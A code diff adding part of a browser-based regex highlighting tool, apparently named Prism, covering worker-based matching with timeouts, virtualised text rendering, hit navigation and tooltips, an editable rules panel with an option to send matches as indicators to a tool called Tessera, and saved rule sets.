+      open: false, err: null, timedOut: false, count: 0, truncated: false,
+    };
+  }
+  function validate(r) {
+    r.err = null;
+    if (!r.pattern) return;
+    try { new RegExp(r.pattern, r.flags); } catch (e) { r.err = e.message.replace(/^Invalid regular expression: /, ''); }
+  }
+  function indexRules() { S.ruleById = new Map(S.rules.map((r) => [r.id, r])); }
+  const ruleExport = (r) => ({ name: r.name, pattern: r.pattern, flags: r.flags, color: r.color, style: r.style, desc: r.desc, on: r.on, ioc: r.ioc });
+  function saveRules(markDirty = true) {
+    store.set('prism.rules', S.rules.map(ruleExport));
+    if (markDirty && S.set) { S.setDirty = true; }
+    store.set('prism.current', { set: S.set, dirty: S.setDirty });
+    renderSetName();
+  }
+  function setRules(list, setName) {
+    S.rules = list.map(normRule);
+    S.rules.forEach(validate);
+    indexRules();
+    S.set = setName || null; S.setDirty = false;
+    saveRules(false);
+    updateRuleStyles(); renderRules(); runMatch(0);
+  }
+  function nextColor() {
+    const used = new Set(S.rules.map((r) => r.color));
+    return PALETTE.find((c) => !used.has(c)) || PALETTE[S.rules.length % PALETTE.length];
+  }
+
+  function hexRgb(h) { const n = parseInt(h.slice(1), 16); return [(n >> 16) & 255, (n >> 8) & 255, n & 255]; }
+  function ruleCss(r) {
+    const [R, G, B] = hexRgb(r.color), c = `rgb(${R},${G},${B})`, a = (x) => `rgba(${R},${G},${B},${x})`;
+    switch (r.style) {
+      case 'underline': return `box-shadow: inset 0 -2px 0 ${c};`;
+      case 'box': return `box-shadow: inset 0 0 0 1.5px ${c}; background: ${a(0.08)};`;
+      case 'text': return `color: ${c}; font-weight: 700;`;
+      default: return `background: ${a(0.32)}; box-shadow: inset 0 -2px 0 ${a(0.95)};`;
+    }
+  }
+  function updateRuleStyles() {
+    $('ruleStyles').textContent = S.rules.map((r) => `.r-${r.id}{${ruleCss(r)}}`).join('\n');
+  }
+
+  // ---------- Matching (in a worker so a bad regex can't freeze the page) ----------
+  function matchAll(text, r, cap) {
+    const res = { id: r.id, s: [], e: [], g: [], truncated: false, error: null };
+    try {
+      const flags = Array.from(new Set((r.flags + 'g').split(''))).join('');
+      const re = new RegExp(r.pattern, flags);
+      let m;
+      while ((m = re.exec(text)) !== null) {
+        const len = m[0].length;
+        if (len === 0) { re.lastIndex++; continue; }
+        res.s.push(m.index); res.e.push(m.index + len);
+        res.g.push(m.length > 1 ? { l: m.slice(1).map((x) => (x === undefined ? null : x)), n: m.groups ? Object.assign({}, m.groups) : null } : null);
+        if (res.s.length >= cap) { res.truncated = true; break; }
+      }
+    } catch (err) { res.error = String((err && err.message) || err); }
+    return res;
+  }
+  const WORKER_SRC = `const matchAll = ${matchAll.toString()};
+let text = '';
+onmessage = (e) => {
+  const d = e.data;
+  if (d.type === 'text') { text = d.text; return; }
+  if (d.type !== 'run') return;
+  const results = [];
+  for (const r of d.rules) { postMessage({ type: 'rule', job: d.job, id: r.id }); results.push(matchAll(text, r, d.cap)); }
+  postMessage({ type: 'done', job: d.job, results });
+};`;
+  let worker = null, workerVer = -1, job = 0, runTimer = null, killTimer = null, curRuleId = null, runStart = 0;
+
+  function getWorker() {
+    if (worker) return worker;
+    try {
+      worker = new Worker(URL.createObjectURL(new Blob([WORKER_SRC], { type: 'text/javascript' })));
+      worker.onmessage = onWorkerMsg;
+      workerVer = -1;
+    } catch (e) { worker = null; }
+    return worker;
+  }
+  function killWorker() { if (worker) { worker.terminate(); worker = null; } }
+  function onWorkerMsg(e) {
+    const d = e.data;
+    if (d.job !== job) return;
+    if (d.type === 'rule') curRuleId = d.id;
+    else if (d.type === 'done') {
+      clearTimeout(killTimer);
+      S.running = false;
+      applyResults(d.results, performance.now() - runStart);
+    }
+  }
+  function runMatch(delay = 220) {
+    clearTimeout(runTimer);
+    runTimer = setTimeout(doRun, delay);
+  }
+  function doRun() {
+    const rules = S.rules.filter((r) => r.on && r.pattern && !r.err && !r.timedOut).map((r) => ({ id: r.id, pattern: r.pattern, flags: r.flags }));
+    job++;
+    clearTimeout(killTimer);
+    if (S.running) { killWorker(); S.running = false; }
+    if (!S.text || !rules.length) { applyResults([], 0); return; }
+    runStart = performance.now();
+    const w = getWorker();
+    if (!w) { applyResults(rules.map((r) => matchAll(S.text, r, CAP)), performance.now() - runStart); return; }
+    if (workerVer !== S.textVer) { w.postMessage({ type: 'text', text: S.text }); workerVer = S.textVer; }
+    S.running = true; curRuleId = null;
+    renderStatus();
+    const my = job;
+    killTimer = setTimeout(() => {
+      if (my !== job || !S.running) return;
+      killWorker(); S.running = false;
+      const r = S.ruleById.get(curRuleId);
+      if (r) {
+        r.timedOut = true;
+        toast(`“${r.name}” took too long and was paused. Look for runaway backtracking, like nested quantifiers.`);
+        renderRules();
+      } else toast('Matching took too long and was stopped.');
+      doRun();
+    }, TIMEOUT);
+    w.postMessage({ type: 'run', job: my, rules, cap: CAP });
+  }
+
+  function applyResults(results, ms, skipView) {
+    const prio = new Map(S.rules.map((r, i) => [r.id, i]));
+    for (const r of S.rules) { r.count = 0; r.truncated = false; }
+    const hits = [], ruleHits = new Map();
+    for (const res of results) {
+      const r = S.ruleById.get(res.id);
+      if (!r) continue;
+      if (res.error) { r.err = res.error; continue; }
+      r.count = res.s.length; r.truncated = res.truncated;
+      const ids = [];
+      const p = prio.get(r.id);
+      for (let k = 0; k < res.s.length; k++) { ids.push(hits.length); hits.push({ rid: r.id, p, s: res.s[k], e: res.e[k], g: res.g[k] }); }
+      ruleHits.set(r.id, ids);
+    }
+    S.hits = hits; S.ruleHits = ruleHits;
+    S.order = hits.map((_, i) => i).sort((a, b) => hits[a].s - hits[b].s || hits[a].p - hits[b].p);
+    buildSegs();
+    S.lastMs = ms;
+    S.curHit = -1; S.curSeg = -1;
+    hideTip(true);
+    if (!skipView) {
+      const wasOnly = S.viewLines !== null;
+      computeViewLines();
+      if (wasOnly || S.viewLines) rebuildView(topLine()); else refreshView();
+    }
+    updateBadges(); renderStatus(); renderHitPos();
+  }
+
+  function buildSegs() {
+    const H = S.hits, n = H.length;
+    const segS = [], segE = [], segH = [];
+    if (n) {
+      const pts = new Float64Array(n * 2);
+      for (let i = 0; i < n; i++) { pts[2 * i] = H[i].s; pts[2 * i + 1] = H[i].e; }
+      pts.sort();
+      const u = [];
+      for (let i = 0; i < pts.length; i++) if (!u.length || u[u.length - 1] !== pts[i]) u.push(pts[i]);
+      let active = [], j = 0;
+      const byS = S.order;
+      for (let k = 0; k < u.length - 1; k++) {
+        const p = u[k];
+        if (active.length) active = active.filter((h) => H[h].e > p);
+        while (j < n && H[byS[j]].s === p) { active.push(byS[j]); j++; }
+        if (active.length) {
+          segS.push(p); segE.push(u[k + 1]);
+          segH.push(active.length === 1 ? [active[0]] : active.slice().sort((a, b) => H[a].p - H[b].p));
+        }
+      }
+    }
+    S.segS = segS; S.segE = segE; S.segH = segH;
+  }
+  function segAt(off) {
+    const E = S.segE; let lo = 0, hi = E.length;
+    while (lo < hi) { const m = (lo + hi) >> 1; if (E[m] > off) hi = m; else lo = m + 1; }
+    return lo;
+  }
+  function computeViewLines() {
+    if (!$('optOnly').checked || !S.text) { S.viewLines = null; return; }
+    const n = lineCount(), flag = new Uint8Array(n);
+    for (let k = 0; k < S.segS.length; k++) {
+      const a = lineOf(S.segS[k]), b = lineOf(S.segE[k] - 1);
+      for (let l = a; l <= b; l++) flag[l] = 1;
+    }
+    const v = [];
+    for (let l = 0; l < n; l++) if (flag[l]) v.push(l);
+    S.viewLines = v;
+  }
+  const viewCount = () => (S.viewLines ? S.viewLines.length : lineCount());
+  const lineAtPos = (p) => (S.viewLines ? S.viewLines[p] : p);
+  function posOfLine(L) {
+    const v = S.viewLines; if (!v) return L;
+    let lo = 0, hi = v.length - 1;
+    while (lo <= hi) { const m = (lo + hi) >> 1; if (v[m] === L) return m; if (v[m] < L) lo = m + 1; else hi = m - 1; }
+    return -1;
+  }
+
+  // ---------- Rendering the text ----------
+  let observer = null, charW = 7.5;
+  function measure() {
+    const p = document.createElement('span');
+    p.className = 'tx'; p.style.cssText = 'position:absolute;visibility:hidden;padding:0';
+    p.textContent = 'M'.repeat(200);
+    view.appendChild(p); charW = p.getBoundingClientRect().width / 200 || 7.5; p.remove();
+  }
+  function wrapCols() {
+    const gutter = (String(lineCount()).length) * charW + 22 + 24;
+    return Math.max(10, Math.floor((view.clientWidth - gutter) / charW));
+  }
+  function estimate(b) {
+    const from = b * BLOCK, to = Math.min(viewCount(), from + BLOCK);
+    if (!view.classList.contains('wrap')) return (to - from) * LH;
+    const cols = wrapCols(); let rows = 0;
+    for (let p = from; p < to; p++) { const L = lineAtPos(p); rows += Math.max(1, Math.ceil((lineEnd(L) - S.starts[L]) / cols)); }
+    return rows * LH;
+  }
+  function lineHtml(L, forExport) {
+    const t = S.text, ls = S.starts[L], le = lineEnd(L);
+    const { segS, segE, segH, hits } = S;
+    let k = segAt(ls), c = ls, out = '';
+    while (k < segS.length && segS[k] < le) {
+      const a = Math.max(segS[k], ls), b = Math.min(segE[k], le);
+      if (a > c) out += esc(t.slice(c, a));
+      const hs = segH[k], top = S.ruleById.get(hits[hs[0]].rid);
+      let cls = 'h' + (top ? ' r-' + top.id : '') + (hs.length > 1 ? ' multi' : '') + (k === S.curSeg ? ' cur' : '');
+      const attr = forExport ? ` title="${esc(hs.map((h) => { const r = S.ruleById.get(hits[h].rid); return r ? r.name + (r.desc ? ': ' + r.desc : '') : ''; }).join('\n'))}"` : ` data-k="${k}"`;
+      out += `<span class="${cls}"${attr}>${esc(t.slice(a, b))}</span>`;
+      c = b; k++;
+    }
+    if (c < le) out += esc(t.slice(c, le));
+    return `<div class="ln"${forExport ? '' : ` data-l="${L}"`}><span class="no">${L + 1}</span><span class="tx">${out}</span></div>`;
+  }
+  function renderBlock(el) {
+    if (el._r) return;
+    const b = +el.dataset.b, from = b * BLOCK, to = Math.min(viewCount(), from + BLOCK);
+    let html = '';
+    for (let p = from; p < to; p++) html += lineHtml(lineAtPos(p));
+    el.innerHTML = html; el.style.height = ''; el._r = true;
+  }
+  function unrenderBlock(el) {
+    if (!el._r) return;
+    if (S.pinned && S.tipAnchor && el.contains(S.tipAnchor)) return;
+    const h = el.offsetHeight; el.innerHTML = ''; el.style.height = h + 'px'; el._r = false;
+  }
+  function rebuildView(anchorLine) {
+    if (observer) observer.disconnect();
+    observer = new IntersectionObserver((entries) => {
+      for (const e of entries) { if (e.isIntersecting) renderBlock(e.target); else unrenderBlock(e.target); }
+    }, { root: view, rootMargin: '1200px 0px' });
+    document.documentElement.style.setProperty('--gut', String(Math.max(2, String(lineCount()).length)));
+    measure();
+    const nb = Math.ceil(viewCount() / BLOCK), frag = document.createDocumentFragment();
+    S.blocks = [];
+    for (let b = 0; b < nb; b++) {
+      const d = document.createElement('div');
+      d.className = 'blk'; d.dataset.b = b; d.style.height = estimate(b) + 'px';
+      frag.appendChild(d); S.blocks.push(d);
+    }
+    linesEl.replaceChildren(frag);
+    S.blocks.forEach((d) => observer.observe(d));
+    if (anchorLine != null) scrollToLine(anchorLine, 'start');
+  }
+  function refreshView() {
+    if (!S.blocks.length && viewCount()) { rebuildView(null); return; }
+    for (const el of S.blocks) if (el._r) { el._r = false; renderBlock(el); }
+  }
+  function topLine() {
+    const r = view.getBoundingClientRect();
+    const el = document.elementFromPoint(r.left + 40, r.top + 4);
+    const ln = el && el.closest && el.closest('.ln');
+    return ln && view.contains(ln) ? +ln.dataset.l : null;
+  }
+  function lineEl(L) {
+    const p = posOfLine(L); if (p < 0) return null;
+    const blk = S.blocks[Math.floor(p / BLOCK)]; if (!blk) return null;
+    renderBlock(blk);
+    return blk.children[p % BLOCK] || null;
+  }
+  function scrollToLine(L, where) {
+    const el = lineEl(L); if (!el) return null;
+    el.scrollIntoView({ block: where || 'center' });
+    return el;
+  }
+
+  // ---------- Hit navigation ----------
+  function firstAfter(ids, off) { // first index in ids (sorted by s) with s > off
+    const H = S.hits; let lo = 0, hi = ids.length;
+    while (lo < hi) { const m = (lo + hi) >> 1; if (H[ids[m]].s > off) hi = m; else lo = m + 1; }
+    return lo;
+  }
+  function stepHit(ids, dir) {
+    if (!ids || !ids.length) return;
+    let i;
+    if (dir > 0) { i = firstAfter(ids, S.curOff); if (i >= ids.length) i = 0; }
+    else { i = firstAfter(ids, S.curOff - 1) - 1; if (S.curOff < 0 || i < 0) i = ids.length - 1; }
+    gotoHit(ids[i]);
+  }
+  function gotoHit(h) {
+    const hit = S.hits[h]; if (!hit) return;
+    S.curOff = hit.s; S.curHit = h;
+    const k = segAt(hit.s);
+    const prev = linesEl.querySelector('.h.cur'); if (prev) prev.classList.remove('cur');
+    S.curSeg = k;
+    const L = lineOf(hit.s);
+    if (posOfLine(L) < 0) return;
+    const le = lineEl(L); if (!le) return;
+    const span = le.querySelector(`.h[data-k="${k}"]`);
+    if (span) {
+      span.classList.add('cur');
+      span.scrollIntoView({ block: 'center', inline: 'nearest' });
+      span.classList.remove('flash'); void span.offsetWidth; span.classList.add('flash');
+      requestAnimationFrame(() => showTip(k, span, true, h));
+    } else le.scrollIntoView({ block: 'center' });
+    renderHitPos();
+  }
+  function renderHitPos() {
+    const n = S.hits.length;
+    if (!n) { $('hitPos').textContent = S.text ? 'No hits' : ''; return; }
+    if (S.curHit < 0) { $('hitPos').textContent = fmtN(n) + ' hits'; return; }
+    const i = firstAfter(S.order, S.hits[S.curHit].s - 1);
+    let j = i; while (j < S.order.length && S.order[j] !== S.curHit) j++;
+    $('hitPos').textContent = `${fmtN(j + 1)} of ${fmtN(n)}`;
+  }
+
+  // ---------- Tooltip ----------
+  let hideT = null;
+  function ctxRange(hit) {
+    const mode = $('optCtx').value, n = +mode.slice(1), t = S.text;
+    let a, b;
+    if (mode[0] === 'c') { a = Math.max(0, hit.s - n); b = Math.min(t.length, hit.e + n); }
+    else {
+      const l1 = Math.max(0, lineOf(hit.s) - n), l2 = Math.min(lineCount() - 1, lineOf(Math.max(hit.s, hit.e - 1)) + n);
+      a = S.starts[l1]; b = lineEnd(l2);
+      if (hit.s - a > 1500) a = hit.s - 1500;
+      if (b - hit.e > 1500) b = hit.e + 1500;
+    }
+    return [a, b];
+  }
+  function ctxText(hit) { const [a, b] = ctxRange(hit); return S.text.slice(a, b); }
+  function ctxHtml(hit, r) {
+    const [a, b] = ctxRange(hit), t = S.text;
+    const nl = (s) => esc(s).replace(/\r?\n/g, '<span class="nl">↵</span>\n');
+    return (a > 0 && t[a - 1] !== '\n' ? '…' : '') + nl(t.slice(a, hit.s)) +
+      `<span class="h r-${r.id}">${nl(t.slice(hit.s, hit.e))}</span>` + nl(t.slice(hit.e, b)) + (b < t.length && t[b] !== '\n' && t[b] !== '\r' ? '…' : '');
+  }
+  function tipHit(h, pinned) {
+    const hit = S.hits[h], r = S.ruleById.get(hit.rid);
+    if (!r) return '';
+    const L = lineOf(hit.s), col = hit.s - S.starts[L] + 1;
+    const ids = S.ruleHits.get(r.id) || [];
+    const idx = firstAfter(ids, hit.s - 1) + 1;
+    const val = S.text.slice(hit.s, Math.min(hit.e, hit.s + 2000));
+    let groups = '';
+    if (hit.g) {
+      const rows = [];
+      const named = hit.g.n ? Object.entries(hit.g.n).filter(([, v]) => v != null) : [];
+      const namedVals = named.map(([, v]) => v);
+      hit.g.l.forEach((v, i) => { if (v == null) return; const j = namedVals.indexOf(v); if (j >= 0) namedVals[j] = undefined; else rows.push([`$${i + 1}`, v]); });
+      rows.push(...named);
+      if (rows.length) groups = `<div class="tip-groups">${rows.map(([k, v]) => `<span>${esc(k)}</span><span>${esc(v.length > 300 ? v.slice(0, 300) + '…' : v)}</span>`).join('')}</div>`;
+    }
+    return `<div class="tip-hit" data-h="${h}">
+      <div class="tip-head"><span class="chip" style="background:${r.color}"></span><b>${esc(r.name)}</b><span class="muted small">${fmtN(idx)} of ${fmtN(ids.length)} · line ${fmtN(L + 1)}, col ${fmtN(col)}</span>${pinned ? '<button class="tip-close" data-tip="close" title="Close (Esc)">×</button>' : ''}</div>
+      ${r.desc ? `<div class="tip-desc">${esc(r.desc)}</div>` : ''}
+      <div class="tip-val">${esc(val)}${hit.e - hit.s > 2000 ? '…' : ''}</div>
+      ${groups}
+      <div class="tip-ctx">${ctxHtml(hit, r)}</div>
+      ${pinned ? `<div class="tip-act">
+        <button class="btn small" data-tip="copy-val">Copy match</button>
+        <button class="btn small" data-tip="copy-ctx">Copy context</button>
+        <button class="btn small" data-tip="prev" title="Previous ${esc(r.name)} hit">‹ Prev</button>
+        <button class="btn small" data-tip="next" title="Next ${esc(r.name)} hit">Next ›</button>
+      </div>` : ''}
+    </div>`;
+  }
+  function showTip(k, anchor, pinned, focusHit) {
+    clearTimeout(hideT);
+    let hs = S.segH[k]; if (!hs) return;
+    if (focusHit != null && hs.includes(focusHit)) hs = [focusHit, ...hs.filter((h) => h !== focusHit)];
+    const shown = hs.slice(0, pinned ? 6 : 3);
+    tip.innerHTML = shown.map((h) => tipHit(h, pinned)).join('') +
+      (hs.length > shown.length ? `<div class="tip-more">+${hs.length - shown.length} more rules match here</div>` : '') +
+      (pinned ? '' : '<div class="tip-hint">Click to pin</div>');
+    tip.classList.toggle('pinned', !!pinned);
+    S.pinned = !!pinned; S.tipAnchor = anchor;
+    placeTip(anchor);
+    if (pinned) tip.querySelectorAll('.tip-ctx .h').forEach((m) => { const c = m.parentElement; c.scrollTop = Math.max(0, m.offsetTop - c.clientHeight / 2); });
+  }
+  function placeTip(anchor) {
+    const r = anchor.getBoundingClientRect();
+    tip.hidden = false; tip.style.left = '0px'; tip.style.top = '0px';
+    const tw = tip.offsetWidth, th = tip.offsetHeight;
+    let x = Math.min(Math.max(8, r.left), innerWidth - tw - 8);
+    let y = r.bottom + 6;
+    if (y + th > innerHeight - 8) y = r.top - th - 6;
+    if (y < 8) y = Math.max(8, innerHeight - th - 8);
+    tip.style.left = x + 'px'; tip.style.top = y + 'px';
+  }
+  function hideTip(force) {
+    if (S.pinned && !force) return;
+    tip.hidden = true; S.pinned = false; S.tipAnchor = null;
+  }
+
+  view.addEventListener('mouseover', (e) => {
+    if (S.pinned) return;
+    const sp = e.target.closest && e.target.closest('.h');
+    if (!sp) return;
+    showTip(+sp.dataset.k, sp, false);
+  });
+  view.addEventListener('mouseout', (e) => {
+    if (S.pinned) return;
+    const to = e.relatedTarget;
+    if (to && to.closest && to.closest('.h')) return;
+    clearTimeout(hideT); hideT = setTimeout(() => hideTip(), 120);
+  });
+  view.addEventListener('click', (e) => {
+    const sp = e.target.closest('.h');
+    const sel = getSelection();
+    if (sel && !sel.isCollapsed) return;
+    if (sp) {
+      const k = +sp.dataset.k, h = S.segH[k][0];
+      const prev = linesEl.querySelector('.h.cur'); if (prev) prev.classList.remove('cur');
+      sp.classList.add('cur'); S.curSeg = k; S.curHit = h; S.curOff = S.hits[h].s;
+      showTip(k, sp, true); renderHitPos();
+    } else if (S.pinned) hideTip(true);
+  });
+  let scrollRaf = 0;
+  view.addEventListener('scroll', () => {
+    if (scrollRaf) return;
+    scrollRaf = requestAnimationFrame(() => {
+      scrollRaf = 0;
+      if (tip.hidden) return;
+      if (S.pinned && S.tipAnchor && S.tipAnchor.isConnected) {
+        const r = S.tipAnchor.getBoundingClientRect(), v = view.getBoundingClientRect();
+        if (r.bottom < v.top || r.top > v.bottom) tip.hidden = true; else placeTip(S.tipAnchor);
+      } else hideTip(true);
+    });
+  });
+  tip.addEventListener('click', (e) => {
+    const b = e.target.closest('[data-tip]'); if (!b) return;
+    const h = +b.closest('.tip-hit').dataset.h, hit = S.hits[h];
+    const act = b.dataset.tip;
+    if (act === 'close') hideTip(true);
+    else if (act === 'copy-val') copy(S.text.slice(hit.s, hit.e), 'Match copied');
+    else if (act === 'copy-ctx') copy(ctxText(hit), 'Context copied');
+    else if (act === 'next' || act === 'prev') { S.curOff = hit.s; stepHit(S.ruleHits.get(hit.rid), act === 'next' ? 1 : -1); }
+  });
+
+  // ---------- Rules panel ----------
+  function ruleCard(r) {
+    const flag = (f, label, title) => `<label title="${title}"><input type="checkbox" data-flag="${f}"${r.flags.includes(f) ? ' checked' : ''}> ${label}</label>`;
+    return `<div class="rule${r.on ? '' : ' off'}${r.open ? ' open' : ''}" data-id="${r.id}">
+      <div class="rule-row">
+        <span class="grip" title="Drag to reorder">⋮⋮</span>
+        <input type="checkbox" class="on-box" data-f="on"${r.on ? ' checked' : ''} title="Turn this rule on or off">
+        <label class="swatch" style="--c:${r.color}" title="Color"><input type="color" data-f="color" value="${r.color}"></label>
+        <button class="rule-name" type="button" data-act="toggle" title="${esc(r.pattern)}"><span class="caret">${r.open ? '▾' : '▸'}</span> <span data-name>${esc(r.name)}</span></button>
+        <span class="badge" data-act="next" data-badge></span>
+        <button class="btn icon small" type="button" data-act="prev" title="Previous hit">‹</button>
+        <button class="btn icon small" type="button" data-act="next" title="Next hit">›</button>
+      </div>
+      <div class="rule-body">
+        <label class="field"><span>Name</span><input type="text" data-f="name" value="${esc(r.name)}" autocomplete="off"></label>
+        <label class="field"><span>Pattern (JavaScript regex, no slashes)</span><textarea class="mono" rows="2" data-f="pattern" spellcheck="false" autocomplete="off">${esc(r.pattern)}</textarea></label>
+        <div class="err-msg" data-err></div>
+        <div class="flags">${flag('i', 'Ignore case', 'i flag')}${flag('m', 'Multiline ^ $', 'm flag: ^ and $ match at each line')}${flag('s', 'Dot matches newline', 's flag')}</div>
+        <div class="row2">
+          <label class="field"><span>Style</span><select data-f="style">${Object.entries(STYLES).map(([k, v]) => `<option value="${k}"${r.style === k ? ' selected' : ''}>${v}</option>`).join('')}</select></label>
+          <div class="field"><span>Color</span><div class="swatches">${PALETTE.map((c) => `<button type="button" data-color="${c}" style="--c:${c}" title="${c}"${c === r.color ? ' class="on"' : ''}></button>`).join('')}</div></div>
+        </div>
+        <label class="field"><span>Note (shown on hover)</span><textarea rows="2" data-f="desc">${esc(r.desc)}</textarea></label>
+        <div class="flags"><label title="When you send indicators to Tessera, include this rule's matches"><input type="checkbox" data-f="ioc"${r.ioc ? ' checked' : ''}> Matches are indicators (sent to Tessera)</label></div>
+        <div class="rule-actions">
+          <button class="btn small" type="button" data-act="dup">Duplicate</button>
+          <button class="btn small danger" type="button" data-act="del">Delete</button>
+        </div>
+      </div>
+    </div>`;
+  }
+  function renderRules() {
+    $('rules').innerHTML = S.rules.length ? S.rules.map(ruleCard).join('') :
+      '<div class="muted" style="padding:16px 8px;text-align:center">No rules yet. Add one, make one from selected text, or load a set from <b>Sets</b>.</div>';
+    updateBadges();
+  }
+  function updateBadges() {
+    const on = S.rules.filter((r) => r.on).length;
+    $('ruleCount').textContent = S.rules.length ? `${on}/${S.rules.length} on` : '';
+    for (const card of $('rules').querySelectorAll('.rule')) {
+      const r = S.ruleById.get(card.dataset.id); if (!r) continue;
+      const b = card.querySelector('[data-badge]');
+      b.className = 'badge'; b.title = '';
+      if (r.err) { b.textContent = '!'; b.classList.add('err'); b.title = r.err; }
+      else if (r.timedOut) { b.textContent = 'paused'; b.classList.add('pause'); b.title = 'Took too long. Edit the pattern to try again.'; }
+      else if (!r.on || !r.pattern) b.textContent = '–';
+      else { b.textContent = fmtN(r.count) + (r.truncated ? '+' : ''); b.classList.toggle('has', r.count > 0); b.title = r.truncated ? `Stopped at ${fmtN(CAP)} hits` : 'Click for next hit'; }
+      card.querySelector('[data-err]').textContent = r.err ? r.err : r.timedOut ? 'Paused: this pattern took too long on this text. Edit it to try again.' : '';
+    }
+  }
+
+  const rulesEl = $('rules');
+  rulesEl.addEventListener('input', (e) => {
+    const card = e.target.closest('.rule'); if (!card) return;
+    const r = S.ruleById.get(card.dataset.id); if (!r) return;
+    const f = e.target.dataset.f, fl = e.target.dataset.flag;
+    if (fl) {
+      r.flags = e.target.checked ? r.flags + fl : r.flags.replace(fl, '');
+      validate(r); r.timedOut = false; runMatch();
+    } else if (f === 'pattern') {
+      r.pattern = e.target.value; validate(r); r.timedOut = false;
+      card.querySelector('.rule-name').title = r.pattern;
+      runMatch();
+    } else if (f === 'name') { r.name = e.target.value; card.querySelector('[data-name]').textContent = r.name || 'Rule'; }
+    else if (f === 'desc') r.desc = e.target.value;
+    else if (f === 'ioc') r.ioc = e.target.checked;
+    else if (f === 'color') setColor(r, card, e.target.value);
+    else if (f === 'style') { r.style = e.target.value; updateRuleStyles(); }
+    else if (f === 'on') { r.on = e.target.checked; card.classList.toggle('off', !r.on); runMatch(0); }
+    updateBadges(); saveRules();
+  });
+  function setColor(r, card, c) {
+    r.color = c.toLowerCase();
+    card.querySelector('.swatch').style.setProperty('--c', r.color);
+    card.querySelector('.swatch input').value = r.color;
+    card.querySelectorAll('.swatches button').forEach((b) => b.classList.toggle('on', b.dataset.color === r.color));
+    updateRuleStyles(); saveRules();
+  }
+  rulesEl.addEventListener('click', (e) => {
+    const card = e.target.closest('.rule'); if (!card) return;
+    const r = S.ruleById.get(card.dataset.id); if (!r) return;
+    const sw = e.target.closest('[data-color]');
+    if (sw) { setColor(r, card, sw.dataset.color); return; }
+    const a = e.target.closest('[data-act]'); if (!a) return;
+    const act = a.dataset.act;
+    if (act === 'toggle') { r.open = !r.open; card.classList.toggle('open', r.open); card.querySelector('.caret').textContent = r.open ? '▾' : '▸'; if (r.open) card.querySelector('[data-f="pattern"]').focus(); }
+    else if (act === 'next' || act === 'prev') {
+      const ids = S.ruleHits.get(r.id);
+      if (!ids || !ids.length) { toast(r.on ? `No hits for “${r.name}”` : `“${r.name}” is off`); return; }
+      stepHit(ids, act === 'next' && !e.shiftKey ? 1 : -1);
+    }
+    else if (act === 'dup') {
+      const c = normRule(ruleExport(r)); c.name = r.name + ' copy'; c.open = true; validate(c);
+      S.rules.splice(S.rules.indexOf(r) + 1, 0, c); afterStructure();
+    }
+    else if (act === 'del') {
+      const i = S.rules.indexOf(r); S.rules.splice(i, 1); afterStructure();
+      toast(`Deleted “${r.name}”`, { label: 'Undo', fn: () => { S.rules.splice(i, 0, r); afterStructure(); } });
+    }
+  });
+  function afterStructure() { indexRules(); updateRuleStyles(); renderRules(); saveRules(); runMatch(0); }
+
+  // Drag to reorder
+  let dragId = null;
+  rulesEl.addEventListener('mousedown', (e) => { const g = e.target.closest('.grip'); if (g) g.closest('.rule').draggable = true; });
+  rulesEl.addEventListener('dragstart', (e) => { const c = e.target.closest('.rule'); if (!c) return; dragId = c.dataset.id; e.dataTransfer.effectAllowed = 'move'; e.dataTransfer.setData('text/plain', dragId); });
+  rulesEl.addEventListener('dragover', (e) => {
+    if (!dragId) return;
+    const c = e.target.closest('.rule'); e.preventDefault();
+    rulesEl.querySelectorAll('.drop-before,.drop-after').forEach((x) => x.classList.remove('drop-before', 'drop-after'));
+    if (!c || c.dataset.id === dragId) return;
+    const r = c.getBoundingClientRect();
+    c.classList.add(e.clientY < r.top + r.height / 2 ? 'drop-before' : 'drop-after');
+  });
+  rulesEl.addEventListener('drop', (e) => {
+    if (!dragId) return; e.preventDefault();
+    const c = rulesEl.querySelector('.drop-before,.drop-after');
+    if (c) {
+      const before = c.classList.contains('drop-before');
+      const moving = S.ruleById.get(dragId), target = S.ruleById.get(c.dataset.id);
+      S.rules.splice(S.rules.indexOf(moving), 1);
+      S.rules.splice(S.rules.indexOf(target) + (before ? 0 : 1), 0, moving);
+      afterStructure();
+    }
+    dragId = null;
+  });
+  rulesEl.addEventListener('dragend', (e) => {
+    dragId = null;
+    rulesEl.querySelectorAll('.rule').forEach((x) => { x.draggable = false; x.classList.remove('drop-before', 'drop-after'); });
+  });
+
+  $('addRule').addEventListener('click', () => {
+    const r = normRule({ name: 'New rule', pattern: '', flags: 'i', color: nextColor() });
+    r.open = true; S.rules.unshift(r); afterStructure();
+    rulesEl.scrollTop = 0;
+    const ta = rulesEl.querySelector(`.rule[data-id="${r.id}"] [data-f="pattern"]`); if (ta) ta.focus();
+  });
+  $('fromSel').addEventListener('click', () => {
+    const sel = getSelection(), txt = sel ? sel.toString() : '';
+    if (!txt || !sel.anchorNode || !view.contains(sel.anchorNode)) { toast('Select some text in the viewer first'); return; }
+    const pattern = txt.replace(/[.*+?^${}()|[\]\\]/g, '\\$&').replace(/\r?\n/g, '\\r?\\n');
+    const short = txt.replace(/\s+/g, ' ').trim();
+    const r = normRule({ name: short.length > 28 ? short.slice(0, 28) + '…' : short, pattern, flags: 'i', color: nextColor() });
+    r.open = true; validate(r); S.rules.unshift(r); afterStructure(); rulesEl.scrollTop = 0;
+  });
+
+  // ---------- Rule sets (saved in the browser) and rule files ----------
+  const getSets = () => store.get('prism.sets', {});
+  function renderSetName() {
+    const el = $('setName');
+    if (S.set) el.innerHTML = `Set: <b>${esc(S.set)}</b>${S.setDirty ? '<span class="dirty" title="Changed since you saved it">• unsaved changes</span>' : ''}`;
+    else el.innerHTML = 'Unsaved rules. Use <b>Sets ▾</b> to save them by name.';
+  }
+  function renderSetsMenu() {
+    const sets = getSets(), names = Object.keys(sets).sort((a, b) => a.localeCompare(b));
+    let h = '<div class="menu-label">Saved in this browser</div>';
+    h += names.length ? names.map((n) => `<div class="set-row"><button type="button" data-set-load="${esc(n)}" title="Load “${esc(n)}”">${esc(n)}<span class="set-meta">${sets[n].rules.length} rules</span></button><button type="button" class="set-del" data-set-del="${esc(n)}" title="Delete this set">×</button></div>`).join('')
+      : '<div class="menu-empty">No saved sets yet</div>';
+    h += '<div class="menu-sep"></div>';
+    if (S.set) h += `<button type="button" data-sets="save">Save “${esc(S.set)}”</button>`;
+    h += '<button type="button" data-sets="saveas">Save rules as a new set…</button>';
+    h += '<div class="menu-sep"></div><div class="menu-label">Files</div>';
+    h += '<button type="button" data-sets="export">Save rules to a file…</button>';
+    h += '<button type="button" data-sets="link">Copy a link to these rules</button>';
+    h += '<button type="button" data-sets="import-replace">Load rules from a file…</button>';
